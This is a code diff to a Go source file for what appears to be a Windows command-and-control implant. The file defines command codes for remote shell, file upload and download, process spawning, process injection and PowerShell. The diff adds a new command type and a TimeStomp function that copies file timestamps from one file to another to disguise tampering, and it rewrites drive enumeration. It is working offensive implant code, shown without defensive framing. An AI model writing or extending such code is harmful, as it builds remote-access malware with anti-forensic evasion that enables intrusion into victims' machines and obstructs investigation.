@@ -14,8 +14,6 @@ import (
 	"os"
 	"path/filepath"
 	"time"
-	"unicode/utf16"
-
 	//"runtime"
 	"strconv"
 	"strings"
@@ -60,17 +58,16 @@ const (
 )
 
 const (
-	CMD_TYPE_SLEEP        = 4
-	CMD_TYPE_PAUSE        = 47
-	CMD_TYPE_SHELL        = 78
-	CMD_TYPE_UPLOAD_START = 10
-	CMD_TYPE_UPLOAD_LOOP  = 67
-	CMD_TYPE_DOWNLOAD     = 11
-	CMD_TYPE_EXIT         = 3
-	CMD_TYPE_CD           = 5
-	CMD_TYPE_PWD          = 39
-	CMD_TYPE_FILE_BROWSE  = 53
-
+	CMD_TYPE_SLEEP                      = 4
+	CMD_TYPE_PAUSE                      = 47
+	CMD_TYPE_SHELL                      = 78
+	CMD_TYPE_UPLOAD_START               = 10
+	CMD_TYPE_UPLOAD_LOOP                = 67
+	CMD_TYPE_DOWNLOAD                   = 11
+	CMD_TYPE_EXIT                       = 3
+	CMD_TYPE_CD                         = 5
+	CMD_TYPE_PWD                        = 39
+	CMD_TYPE_FILE_BROWSE                = 53
 	CMD_TYPE_SPAWN_X64                  = 44
 	CMD_TYPE_SPAWN_X86                  = 1
 	CMD_TYPE_EXECUTE                    = 12
@@ -99,6 +96,7 @@ const (
 	CMD_TYPE_POWERSHELL_PORT            = 79
 	CMD_TYPE_INJECT_X64                 = 43
 	CMD_TYPE_INJECT_X86                 = 9
+	CMD_TYPE_BOF                        = 100
 )
 
 func ParseCommandShell(b []byte) (string, []byte, error) {
@@ -251,6 +249,33 @@ func File_Browse(b []byte) ([]byte, error) {
 
 	return util.BytesCombine(pendingRequest, []byte(resultStr)), nil
 
+}
+
+func TimeStomp(from []byte, to []byte) ([]byte, error) {
+	fromPtr := windows.StringToUTF16Ptr(string(from))
+	toPtr := windows.StringToUTF16Ptr(string(to))
+	fromHandle, err := windows.CreateFile(fromPtr, windows.GENERIC_READ, 0, nil, windows.OPEN_EXISTING, windows.FILE_ATTRIBUTE_NORMAL, windows.InvalidHandle)
+	if err != nil {
+		return nil, err
+	}
+	defer windows.CloseHandle(fromHandle)
+	toHandle, err := windows.CreateFile(toPtr, windows.GENERIC_WRITE, 0, nil, windows.OPEN_EXISTING, windows.FILE_ATTRIBUTE_NORMAL, windows.InvalidHandle)
+	if err != nil {
+		return nil, err
+	}
+	defer windows.CloseHandle(toHandle)
+	var creationTime = &windows.Filetime{}
+	var lastAccessTime = &windows.Filetime{}
+	var lastWriteTime = &windows.Filetime{}
+	_, _, err = GetFileTime.Call(uintptr(fromHandle), uintptr(unsafe.Pointer(creationTime)), uintptr(unsafe.Pointer(lastAccessTime)), uintptr(unsafe.Pointer(lastWriteTime)))
+	if err != nil && err != windows.NTE_OP_OK {
+		return nil, err
+	}
+	err = windows.SetFileTime(toHandle, creationTime, lastAccessTime, lastWriteTime)
+	if err != nil {
+		return nil, err
+	}
+	return []byte(fmt.Sprintf("timestomp %s to %s", from, to)), err
 }
 
 func Execute(b []byte, Token uintptr) ([]byte, error) {
@@ -474,23 +499,21 @@ func PathExists(path string) bool {
 	return false
 }
 
-func Drives() ([]byte, error) {
-	n, err := windows.GetLogicalDriveStrings(0, nil)
+func Drives(b []byte) ([]byte, error) {
+	bitMask, err := windows.GetLogicalDrives()
 	if err != nil {
 		return nil, err
 	}
-	a := make([]uint16, n)
-	_, err = windows.GetLogicalDriveStrings(n, &a[0])
-	if err != nil {
-		return nil, err
+	var result []byte
+	i := 47
+	for bitMask > 0 {
+		if bitMask%2 == 1 {
+			result = append(result, byte(i))
+		}
+		bitMask >>= 1
+		i++
 	}
-	s := string(utf16.Decode(a))
-	arr := strings.Split(strings.TrimRight(s, "\x00"), "\x00")
-	s = ""
-	for _, aa := range arr {
-		s += aa + " "
-	}
-	return []byte(s), nil
+	return util.BytesCombine(b[0:4], result), nil
 }
 
 func Remove(b []byte) ([]byte, error) {
